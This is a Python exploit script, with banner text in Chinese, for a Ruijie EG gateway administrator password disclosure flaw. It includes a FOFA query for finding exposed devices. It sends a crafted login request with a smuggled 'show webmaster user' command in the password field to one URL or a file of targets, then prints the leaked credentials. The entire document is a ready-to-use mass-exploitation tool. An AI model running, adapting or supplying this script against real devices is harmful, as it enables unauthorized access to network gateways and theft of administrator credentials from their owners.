# body="EG易网关 web管理"
import requests
import sys
import argparse
import urllib3
urllib3.disable_warnings()

def banner():
    print('+---------------------------------------------------+')
    print('+ \033[1;36m锐捷EG易网关 管理员账号密码泄露漏洞     \033[0m                +')
    print('+ \033[1;36m作者：r00t\033[0m                                         +')
    print('+ \033[1;36mpython3 xxx.py -u/--url http://xxx.xxx.xxx.xxx\033[0m    +')
    print('+ \033[1;36mpython3 xxx.py -f/--file result.txt\033[0m               +')
    print('+ \033[1;36mfofa 语句：body="EG易网关 web管理"         \033[0m          +')
    print('+---------------------------------------------------+')
if len(sys.argv)==1:
    banner()
    sys.exit()
parser = argparse.ArgumentParser(description='bgbingfofaapi help')
parser.add_argument('-u','--url', help='Please Input a url!',default='')
parser.add_argument('-f','--file', help='Please Input a file!',default='')
args=parser.parse_args()
url=args.url
file=args.file
if url!="":
    url=url+"/login.php"
    header={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded"
            }
    data = 'username=admin&password=admin?show+webmaster+user'
    response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
    if "data" in response.text and response.status_code == 200:
        print("\033[36m[o] 成功获取, 响应为:{} \033[0m".format(response.text))
    else:
        print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m")
if file!="":
    txt=file
    f=open(txt,'r+')
    for i in f.readlines():
        url=i.strip()
        url=url+"/login.php"
        header={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"
                }
        data = 'username=admin&password=admin?show+webmaster+user'
        try:
            response=requests.post(url,data=data,headers=header,verify=False,timeout=10)
            if "data" in response.text and response.status_code == 200:
                print("\033[1;36m" + url + "\033[0m" + "\033[1;32m 存在漏洞\033[0m")
                print("\033[36m[o] 成功获取, 响应为:{} \033[0m".format(response.text))
            else:
                print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m")
        except Exception as e:
            print("\033[1;36m"+url+"\033[0m"+"\033[1;31m 不存在漏洞\033[0m",format(e))
